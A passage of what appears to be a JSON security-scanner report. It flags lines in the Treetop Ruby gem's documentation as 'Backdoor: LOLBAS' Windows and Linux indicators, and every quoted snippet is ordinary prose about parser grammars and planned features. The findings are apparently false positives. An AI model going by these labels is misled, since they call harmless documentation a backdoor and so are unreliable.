                      "text": "hes:\n\n* `'a'`\n* `'(a)'`\n* `'((a))'`\n* etc.\n\n\nOutput from a parser for this grammar looks like this:\n\n![Tree Returned By ParenLanguageParser](./images/paren_language_output.png)\n\nThis is a parse tree whose nodes are instances of `Treetop::Runtime::SyntaxNode`. What if we could define methods on these node objects? We would then have an object-oriented program whose structure corresponded to the structure of our language. Treetop provides two techniques for doing just this.\n\n##Associating Methods with Node-Instantiating Expressions\nSequences and all types of terminals are node-instantiating expression",
                      "markdown": "`hes:\n\n* `'a'`\n* `'(a)'`\n* `'((a))'`\n* etc.\n\n\nOutput from a parser for this grammar looks like this:\n\n![Tree Returned By ParenLanguageParser](./images/paren_language_output.png)\n\nThis is a parse tree whose nodes are instances of `Treetop::Runtime::SyntaxNode`. What if we could define methods on these node objects? We would then have an object-oriented program whose structure corresponded to the structure of our language. Treetop provides two techniques for doing just this.\n\n##Associating Methods with Node-Instantiating Expressions\nSequences and all types of terminals are node-instantiating expression`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/pitfalls_and_advanced_techniques.markdown"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 194,
                  "endLine": 45,
                  "endColumn": 198,
                  "snippet": {
                    "text": "      'end' &space\n    end\n    \nThis says that `'end'` must be followed by a space, but this space is not consumed as part of the matching of `keyword`. This works in most cases, but is actually incorrect. What if `end` occurs at the end of the buffer? In that case, it occurs in isolation but will not match the above expression. What we really mean is that `'end'` cannot be followed by a _non-space_ character.\n\n    rule end_keyword\n      'end' !(!' ' .)\n",
                    "rendered": {
                      "text": "      'end' &space\n    end\n    \nThis says that `'end'` must be followed by a space, but this space is not consumed as part of the matching of `keyword`. This works in most cases, but is actually incorrect. What if `end` occurs at the end of the buffer? In that case, it occurs in isolation but will not match the above expression. What we really mean is that `'end'` cannot be followed by a _non-space_ character.\n\n    rule end_keyword\n      'end' !(!' ' .)\n",
                      "markdown": "`      'end' &space\n    end\n    \nThis says that `'end'` must be followed by a space, but this space is not consumed as part of the matching of `keyword`. This works in most cases, but is actually incorrect. What if `end` occurs at the end of the buffer? In that case, it occurs in isolation but will not match the above expression. What we really mean is that `'end'` cannot be followed by a _non-space_ character.\n\n    rule end_keyword\n      'end' !(!' ' .)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/pitfalls_and_advanced_techniques.markdown"
                },
                "region": {
                  "startLine": 57,
                  "startColumn": 30,
                  "endLine": 57,
                  "endColumn": 38,
                  "snippet": {
                    "text": "s is due to the fact that substring lookups on Ruby unicode strings are linear-time operations, and not constant-time operations like they are on ASCII encoded strings. This means that parse times for larger strings can be exponentially worse than for smaller strings.\n\nIf your input and grammar only expect ASCII strings, you can achieve significant performance improvements for large strings by re-encoding them to ASCII using `input.encode(Encoding::US_ASCII)`. See [this issue on GitHub](https://github.com/cjheath/treetop/issues/31) for more information and other possible workarounds for unicode string",
                    "rendered": {
                      "text": "s is due to the fact that substring lookups on Ruby unicode strings are linear-time operations, and not constant-time operations like they are on ASCII encoded strings. This means that parse times for larger strings can be exponentially worse than for smaller strings.\n\nIf your input and grammar only expect ASCII strings, you can achieve significant performance improvements for large strings by re-encoding them to ASCII using `input.encode(Encoding::US_ASCII)`. See [this issue on GitHub](https://github.com/cjheath/treetop/issues/31) for more information and other possible workarounds for unicode string",
                      "markdown": "`s is due to the fact that substring lookups on Ruby unicode strings are linear-time operations, and not constant-time operations like they are on ASCII encoded strings. This means that parse times for larger strings can be exponentially worse than for smaller strings.\n\nIf your input and grammar only expect ASCII strings, you can achieve significant performance improvements for large strings by re-encoding them to ASCII using `input.encode(Encoding::US_ASCII)`. See [this issue on GitHub](https://github.com/cjheath/treetop/issues/31) for more information and other possible workarounds for unicode string`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/pitfalls_and_advanced_techniques.markdown"
                },
                "region": {
                  "startLine": 55,
                  "startColumn": 135,
                  "endLine": 55,
                  "endColumn": 141,
                  "snippet": {
                    "text": "ps to focus on what you really mean. A keyword is a character not followed by another character that isn't a space.\n\n## Poor Performance with Large Unicode Strings\n\nTreetop may perform poorly when parsing very large (more than 100KB) unicode strings. This is due to the fact that substring lookups on Ruby unicode strings are linear-time operations, and not constant-time operations like they are on ASCII encoded strings. This means that parse times for larger strings can be exponentially worse than for smaller strings.\n\nIf your input and grammar only expect ASCII strings, you can achieve significant p",
                    "rendered": {
                      "text": "ps to focus on what you really mean. A keyword is a character not followed by another character that isn't a space.\n\n## Poor Performance with Large Unicode Strings\n\nTreetop may perform poorly when parsing very large (more than 100KB) unicode strings. This is due to the fact that substring lookups on Ruby unicode strings are linear-time operations, and not constant-time operations like they are on ASCII encoded strings. This means that parse times for larger strings can be exponentially worse than for smaller strings.\n\nIf your input and grammar only expect ASCII strings, you can achieve significant p",
                      "markdown": "`ps to focus on what you really mean. A keyword is a character not followed by another character that isn't a space.\n\n## Poor Performance with Large Unicode Strings\n\nTreetop may perform poorly when parsing very large (more than 100KB) unicode strings. This is due to the fact that substring lookups on Ruby unicode strings are linear-time operations, and not constant-time operations like they are on ASCII encoded strings. This means that parse times for larger strings can be exponentially worse than for smaller strings.\n\nIf your input and grammar only expect ASCII strings, you can achieve significant p`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/contributing_and_planned_features.markdown"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 325,
                  "endLine": 32,
                  "endColumn": 334,
                  "snippet": {
                    "text": " grammars are not entirely context-free, requiring that global state dictate the behavior of the parser in certain circumstances. Treetop does not currently expose explicit parser control to the grammar writer, and instead automatically constructs the syntax tree for them. A means of semantic parser control compatible with this approach would involve callback methods defined on parsing nodes. Each time a node is successfully parsed it will be given an opportunity to set global state and optionally trigger a parse failure on _extrasyntactic_ grounds. Nodes will probably need to define an additional meth",
                    "rendered": {
                      "text": " grammars are not entirely context-free, requiring that global state dictate the behavior of the parser in certain circumstances. Treetop does not currently expose explicit parser control to the grammar writer, and instead automatically constructs the syntax tree for them. A means of semantic parser control compatible with this approach would involve callback methods defined on parsing nodes. Each time a node is successfully parsed it will be given an opportunity to set global state and optionally trigger a parse failure on _extrasyntactic_ grounds. Nodes will probably need to define an additional meth",
                      "markdown": "` grammars are not entirely context-free, requiring that global state dictate the behavior of the parser in certain circumstances. Treetop does not currently expose explicit parser control to the grammar writer, and instead automatically constructs the syntax tree for them. A means of semantic parser control compatible with this approach would involve callback methods defined on parsing nodes. Each time a node is successfully parsed it will be given an opportunity to set global state and optionally trigger a parse failure on _extrasyntactic_ grounds. Nodes will probably need to define an additional meth`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/contributing_and_planned_features.markdown"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 204,
                  "endLine": 32,
                  "endColumn": 213,
                  "snippet": {
                    "text": "ody of these method implementations.\n\n###Global Parsing State and Semantic Backtrack Triggering\nSome programming language grammars are not entirely context-free, requiring that global state dictate the behavior of the parser in certain circumstances. Treetop does not currently expose explicit parser control to the grammar writer, and instead automatically constructs the syntax tree for them. A means of semantic parser control compatible with this approach would involve callback methods defined on parsing nodes. Each time a node is successfully parsed it will be given an opportunity to set global state ",
                    "rendered": {
                      "text": "ody of these method implementations.\n\n###Global Parsing State and Semantic Backtrack Triggering\nSome programming language grammars are not entirely context-free, requiring that global state dictate the behavior of the parser in certain circumstances. Treetop does not currently expose explicit parser control to the grammar writer, and instead automatically constructs the syntax tree for them. A means of semantic parser control compatible with this approach would involve callback methods defined on parsing nodes. Each time a node is successfully parsed it will be given an opportunity to set global state ",
                      "markdown": "`ody of these method implementations.\n\n###Global Parsing State and Semantic Backtrack Triggering\nSome programming language grammars are not entirely context-free, requiring that global state dictate the behavior of the parser in certain circumstances. Treetop does not currently expose explicit parser control to the grammar writer, and instead automatically constructs the syntax tree for them. A means of semantic parser control compatible with this approach would involve callback methods defined on parsing nodes. Each time a node is successfully parsed it will be given an opportunity to set global state `"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/contributing_and_planned_features.markdown"
                },
                "region": {
                  "startLine": 100,
                  "startColumn": 183,
                  "endLine": 100,
                  "endColumn": 189,
                  "snippet": {
                    "text": "      }\n    end\n\nIn this case a block will be detected only if a change in indentation warrants it. Note that this change in the state of indentation must be undone if a subsequent failure causes this node not to ultimately be incorporated into a successful result.\n\nI am by no means sure that the above sketch is free of problems, or even that this overall strategy is sound, but it seems like a promising path.\n",
                    "rendered": {
                      "text": "      }\n    end\n\nIn this case a block will be detected only if a change in indentation warrants it. Note that this change in the state of indentation must be undone if a subsequent failure causes this node not to ultimately be incorporated into a successful result.\n\nI am by no means sure that the above sketch is free of problems, or even that this overall strategy is sound, but it seems like a promising path.\n",
                      "markdown": "`      }\n    end\n\nIn this case a block will be detected only if a change in indentation warrants it. Note that this change in the state of indentation must be undone if a subsequent failure causes this node not to ultimately be incorporated into a successful result.\n\nI am by no means sure that the above sketch is free of problems, or even that this overall strategy is sound, but it seems like a promising path.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/contributing_and_planned_features.markdown"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 432,
                  "endLine": 32,
                  "endColumn": 438,
                  "snippet": {
                    "text": "certain circumstances. Treetop does not currently expose explicit parser control to the grammar writer, and instead automatically constructs the syntax tree for them. A means of semantic parser control compatible with this approach would involve callback methods defined on parsing nodes. Each time a node is successfully parsed it will be given an opportunity to set global state and optionally trigger a parse failure on _extrasyntactic_ grounds. Nodes will probably need to define an additional method that undoes their changes to global state when there is a parse failure and they are backtracked.\n\nHe",
                    "rendered": {
                      "text": "certain circumstances. Treetop does not currently expose explicit parser control to the grammar writer, and instead automatically constructs the syntax tree for them. A means of semantic parser control compatible with this approach would involve callback methods defined on parsing nodes. Each time a node is successfully parsed it will be given an opportunity to set global state and optionally trigger a parse failure on _extrasyntactic_ grounds. Nodes will probably need to define an additional method that undoes their changes to global state when there is a parse failure and they are backtracked.\n\nHe",
                      "markdown": "`certain circumstances. Treetop does not currently expose explicit parser control to the grammar writer, and instead automatically constructs the syntax tree for them. A means of semantic parser control compatible with this approach would involve callback methods defined on parsing nodes. Each time a node is successfully parsed it will be given an opportunity to set global state and optionally trigger a parse failure on _extrasyntactic_ grounds. Nodes will probably need to define an additional method that undoes their changes to global state when there is a parse failure and they are backtracked.\n\nHe`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/contributing_and_planned_features.markdown"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 425,
                  "endLine": 32,
                  "endColumn": 431,
                  "snippet": {
                    "text": "ser in certain circumstances. Treetop does not currently expose explicit parser control to the grammar writer, and instead automatically constructs the syntax tree for them. A means of semantic parser control compatible with this approach would involve callback methods defined on parsing nodes. Each time a node is successfully parsed it will be given an opportunity to set global state and optionally trigger a parse failure on _extrasyntactic_ grounds. Nodes will probably need to define an additional method that undoes their changes to global state when there is a parse failure and they are backtrack",
                    "rendered": {
                      "text": "ser in certain circumstances. Treetop does not currently expose explicit parser control to the grammar writer, and instead automatically constructs the syntax tree for them. A means of semantic parser control compatible with this approach would involve callback methods defined on parsing nodes. Each time a node is successfully parsed it will be given an opportunity to set global state and optionally trigger a parse failure on _extrasyntactic_ grounds. Nodes will probably need to define an additional method that undoes their changes to global state when there is a parse failure and they are backtrack",
                      "markdown": "`ser in certain circumstances. Treetop does not currently expose explicit parser control to the grammar writer, and instead automatically constructs the syntax tree for them. A means of semantic parser control compatible with this approach would involve callback methods defined on parsing nodes. Each time a node is successfully parsed it will be given an opportunity to set global state and optionally trigger a parse failure on _extrasyntactic_ grounds. Nodes will probably need to define an additional method that undoes their changes to global state when there is a parse failure and they are backtrack`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/contributing_and_planned_features.markdown"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 194,
                  "endLine": 29,
                  "endColumn": 200,
                  "snippet": {
                    "text": "ts the parser only to attempt a match without instantiating nodes.\n\n###Generate Rule Implementations in C\nParsing expressions are currently compiled into simple Ruby source code that comprises the body of parsing rules, which are translated into Ruby methods. The generator could produce C instead of Ruby in the body of these method implementations.\n\n###Global Parsing State and Semantic Backtrack Triggering\nSome programming language grammars are not entirely context-free, requiring that global state dictate the behavior of the parser in certain circumstances. Treetop does not currently expose explici",
                    "rendered": {
                      "text": "ts the parser only to attempt a match without instantiating nodes.\n\n###Generate Rule Implementations in C\nParsing expressions are currently compiled into simple Ruby source code that comprises the body of parsing rules, which are translated into Ruby methods. The generator could produce C instead of Ruby in the body of these method implementations.\n\n###Global Parsing State and Semantic Backtrack Triggering\nSome programming language grammars are not entirely context-free, requiring that global state dictate the behavior of the parser in certain circumstances. Treetop does not currently expose explici",
                      "markdown": "`ts the parser only to attempt a match without instantiating nodes.\n\n###Generate Rule Implementations in C\nParsing expressions are currently compiled into simple Ruby source code that comprises the body of parsing rules, which are translated into Ruby methods. The generator could produce C instead of Ruby in the body of these method implementations.\n\n###Global Parsing State and Semantic Backtrack Triggering\nSome programming language grammars are not entirely context-free, requiring that global state dictate the behavior of the parser in certain circumstances. Treetop does not currently expose explici`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/contributing_and_planned_features.markdown"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 139,
                  "endLine": 29,
                  "endColumn": 145,
                  "snippet": {
                    "text": "d be garnered from a transient declaration that instructs the parser only to attempt a match without instantiating nodes.\n\n###Generate Rule Implementations in C\nParsing expressions are currently compiled into simple Ruby source code that comprises the body of parsing rules, which are translated into Ruby methods. The generator could produce C instead of Ruby in the body of these method implementations.\n\n###Global Parsing State and Semantic Backtrack Triggering\nSome programming language grammars are not entirely context-free, requiring that global state dictate the behavior of the parser in certain c",
                    "rendered": {
                      "text": "d be garnered from a transient declaration that instructs the parser only to attempt a match without instantiating nodes.\n\n###Generate Rule Implementations in C\nParsing expressions are currently compiled into simple Ruby source code that comprises the body of parsing rules, which are translated into Ruby methods. The generator could produce C instead of Ruby in the body of these method implementations.\n\n###Global Parsing State and Semantic Backtrack Triggering\nSome programming language grammars are not entirely context-free, requiring that global state dictate the behavior of the parser in certain c",
                      "markdown": "`d be garnered from a transient declaration that instructs the parser only to attempt a match without instantiating nodes.\n\n###Generate Rule Implementations in C\nParsing expressions are currently compiled into simple Ruby source code that comprises the body of parsing rules, which are translated into Ruby methods. The generator could produce C instead of Ruby in the body of these method implementations.\n\n###Global Parsing State and Semantic Backtrack Triggering\nSome programming language grammars are not entirely context-free, requiring that global state dictate the behavior of the parser in certain c`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/contributing_and_planned_features.markdown"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 54,
                  "endLine": 29,
                  "endColumn": 60,
                  "snippet": {
                    "text": "le expression in the parse to correspond to its own syntax node, so much savings could be garnered from a transient declaration that instructs the parser only to attempt a match without instantiating nodes.\n\n###Generate Rule Implementations in C\nParsing expressions are currently compiled into simple Ruby source code that comprises the body of parsing rules, which are translated into Ruby methods. The generator could produce C instead of Ruby in the body of these method implementations.\n\n###Global Parsing State and Semantic Backtrack Triggering\nSome programming language grammars are not entirely cont",
                    "rendered": {
                      "text": "le expression in the parse to correspond to its own syntax node, so much savings could be garnered from a transient declaration that instructs the parser only to attempt a match without instantiating nodes.\n\n###Generate Rule Implementations in C\nParsing expressions are currently compiled into simple Ruby source code that comprises the body of parsing rules, which are translated into Ruby methods. The generator could produce C instead of Ruby in the body of these method implementations.\n\n###Global Parsing State and Semantic Backtrack Triggering\nSome programming language grammars are not entirely cont",
                      "markdown": "`le expression in the parse to correspond to its own syntax node, so much savings could be garnered from a transient declaration that instructs the parser only to attempt a match without instantiating nodes.\n\n###Generate Rule Implementations in C\nParsing expressions are currently compiled into simple Ruby source code that comprises the body of parsing rules, which are translated into Ruby methods. The generator could produce C instead of Ruby in the body of these method implementations.\n\n###Global Parsing State and Semantic Backtrack Triggering\nSome programming language grammars are not entirely cont`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/contributing_and_planned_features.markdown"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 513,
                  "endLine": 13,
                  "endColumn": 519,
                  "snippet": {
                    "text": "various pieces of syntax it should recognize and translate to Ruby. As you change `metagrammar.treetop` and its associated node classes, note that the node classes you are changing are also used to support the previous stable version of the metagrammar, so must be kept backward compatible until such time as a new stable version can be produced to replace it.\n\n##Tests\nMost of the compiler's tests are functional in nature. The grammar under test is used to parse and compile piece of sample code. Then I attempt to parse input with the compiled output and test its results.\n\n#What Needs to be Done\n##Smal",
                    "rendered": {
                      "text": "various pieces of syntax it should recognize and translate to Ruby. As you change `metagrammar.treetop` and its associated node classes, note that the node classes you are changing are also used to support the previous stable version of the metagrammar, so must be kept backward compatible until such time as a new stable version can be produced to replace it.\n\n##Tests\nMost of the compiler's tests are functional in nature. The grammar under test is used to parse and compile piece of sample code. Then I attempt to parse input with the compiled output and test its results.\n\n#What Needs to be Done\n##Smal",
                      "markdown": "`various pieces of syntax it should recognize and translate to Ruby. As you change `metagrammar.treetop` and its associated node classes, note that the node classes you are changing are also used to support the previous stable version of the metagrammar, so must be kept backward compatible until such time as a new stable version can be produced to replace it.\n\n##Tests\nMost of the compiler's tests are functional in nature. The grammar under test is used to parse and compile piece of sample code. Then I attempt to parse input with the compiled output and test its results.\n\n#What Needs to be Done\n##Smal`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/contributing_and_planned_features.markdown"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 363,
                  "endLine": 13,
                  "endColumn": 369,
                  "snippet": {
                    "text": "ategy uses the last stable version of Treetop to parse the version under test. Then the version under test is used to parse and functionally test the various pieces of syntax it should recognize and translate to Ruby. As you change `metagrammar.treetop` and its associated node classes, note that the node classes you are changing are also used to support the previous stable version of the metagrammar, so must be kept backward compatible until such time as a new stable version can be produced to replace it.\n\n##Tests\nMost of the compiler's tests are functional in nature. The grammar under test is used ",
                    "rendered": {
                      "text": "ategy uses the last stable version of Treetop to parse the version under test. Then the version under test is used to parse and functionally test the various pieces of syntax it should recognize and translate to Ruby. As you change `metagrammar.treetop` and its associated node classes, note that the node classes you are changing are also used to support the previous stable version of the metagrammar, so must be kept backward compatible until such time as a new stable version can be produced to replace it.\n\n##Tests\nMost of the compiler's tests are functional in nature. The grammar under test is used ",
                      "markdown": "`ategy uses the last stable version of Treetop to parse the version under test. Then the version under test is used to parse and functionally test the various pieces of syntax it should recognize and translate to Ruby. As you change `metagrammar.treetop` and its associated node classes, note that the node classes you are changing are also used to support the previous stable version of the metagrammar, so must be kept backward compatible until such time as a new stable version can be produced to replace it.\n\n##Tests\nMost of the compiler's tests are functional in nature. The grammar under test is used `"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/contributing_and_planned_features.markdown"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 335,
                  "endLine": 13,
                  "endColumn": 341,
                  "snippet": {
                    "text": "cky. The current testing strategy uses the last stable version of Treetop to parse the version under test. Then the version under test is used to parse and functionally test the various pieces of syntax it should recognize and translate to Ruby. As you change `metagrammar.treetop` and its associated node classes, note that the node classes you are changing are also used to support the previous stable version of the metagrammar, so must be kept backward compatible until such time as a new stable version can be produced to replace it.\n\n##Tests\nMost of the compiler's tests are functional in nature. The",
                    "rendered": {
                      "text": "cky. The current testing strategy uses the last stable version of Treetop to parse the version under test. Then the version under test is used to parse and functionally test the various pieces of syntax it should recognize and translate to Ruby. As you change `metagrammar.treetop` and its associated node classes, note that the node classes you are changing are also used to support the previous stable version of the metagrammar, so must be kept backward compatible until such time as a new stable version can be produced to replace it.\n\n##Tests\nMost of the compiler's tests are functional in nature. The",
                      "markdown": "`cky. The current testing strategy uses the last stable version of Treetop to parse the version under test. Then the version under test is used to parse and functionally test the various pieces of syntax it should recognize and translate to Ruby. As you change `metagrammar.treetop` and its associated node classes, note that the node classes you are changing are also used to support the previous stable version of the metagrammar, so must be kept backward compatible until such time as a new stable version can be produced to replace it.\n\n##Tests\nMost of the compiler's tests are functional in nature. The`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/contributing_and_planned_features.markdown"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 474,
                  "endLine": 11,
                  "endColumn": 480,
                  "snippet": {
                    "text": ". I took a hybrid approach with regard to definition of methods on syntax nodes in the metagrammar. Methods that are more syntactic in nature, like those that provide access to elements of the syntax tree, are often defined inline, directly in the grammar. More semantic methods are defined in custom node classes.\n\nIterating on the metagrammar is tricky. The current testing strategy uses the last stable version of Treetop to parse the version under test. Then the version under test is used to parse and functionally test the various pieces of syntax it should recognize and translate to Ruby. As you ch",
                    "rendered": {
                      "text": ". I took a hybrid approach with regard to definition of methods on syntax nodes in the metagrammar. Methods that are more syntactic in nature, like those that provide access to elements of the syntax tree, are often defined inline, directly in the grammar. More semantic methods are defined in custom node classes.\n\nIterating on the metagrammar is tricky. The current testing strategy uses the last stable version of Treetop to parse the version under test. Then the version under test is used to parse and functionally test the various pieces of syntax it should recognize and translate to Ruby. As you ch",
                      "markdown": "`. I took a hybrid approach with regard to definition of methods on syntax nodes in the metagrammar. Methods that are more syntactic in nature, like those that provide access to elements of the syntax tree, are often defined inline, directly in the grammar. More semantic methods are defined in custom node classes.\n\nIterating on the metagrammar is tricky. The current testing strategy uses the last stable version of Treetop to parse the version under test. Then the version under test is used to parse and functionally test the various pieces of syntax it should recognize and translate to Ruby. As you ch`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
